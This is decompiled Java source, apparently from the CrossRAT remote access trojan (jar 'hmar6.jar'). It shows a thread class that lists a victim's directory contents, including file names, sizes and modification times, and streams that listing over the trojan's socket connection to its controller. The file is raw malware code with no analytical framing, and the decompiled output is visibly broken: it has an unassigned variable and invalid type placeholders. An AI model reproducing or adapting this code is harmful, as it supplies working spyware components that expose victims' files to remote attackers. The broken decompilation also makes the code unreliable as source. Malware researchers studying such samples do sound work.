package crossrat;

import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.OutputStream;

/* loaded from: hmar6.jar:crossrat/c.class */
final class c extends Thread {

    /* renamed from: a */
    private String f32a;

    public c(String str) {
        this.f32a = str;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v10 */
    /* JADX WARN: Type inference failed for: r0v11, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v12, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v27, types: [java.io.BufferedInputStream] */
    /* JADX WARN: Type inference failed for: r0v30 */
    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        ?? r0;
        File file;
        new e();
        File[] listFiles = new File(this.f32a).listFiles();
        String str = "";
        if (listFiles != null) {
            int length = listFiles.length;
            int i = 0;
            while (true) {
                r0 = i;
                if (r0 >= length) {
                    try {
                        break;
                    } catch (Exception e) {
                        r0.printStackTrace();
                        return;
                    }
                }
                str = listFiles[i].isDirectory() ? String.valueOf(str) + 'D' + k.arg_delimit + file.getName() + k.arg_delimit + k.delimit_within_args : String.valueOf(str) + 'F' + k.arg_delimit + file.getName() + k.arg_delimit + file.length() + k.arg_delimit + file.lastModified() + k.arg_delimit + k.delimit_within_args;
                i++;
            }
            r0 = new DataOutputStream(k.l.getOutputStream());
            r0.writeBytes(String.valueOf(k.g) + k.arg_delimit + k.start_list_files + k.arg_delimit + "&&&");
            try {
                r0 = 1000;
                Thread.sleep(1000L);
            } catch (InterruptedException unused) {
                Thread.currentThread().interrupt();
            }
            r0.flush();
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream((String.valueOf(str) + k.stop_list_files).getBytes());
            BufferedInputStream bufferedInputStream = new BufferedInputStream(byteArrayInputStream);
            OutputStream outputStream = k.l.getOutputStream();
            byte[] bArr = new byte[2047];
            while (true) {
                int read = bufferedInputStream.read(bArr);
                if (read == -1) {
                    byteArrayInputStream.close();
                    r0 = bufferedInputStream;
                    r0.close();
                    return;
                }
                outputStream.write(bArr, 0, read);
                Thread.sleep(100L);
            }
        }
    }
}
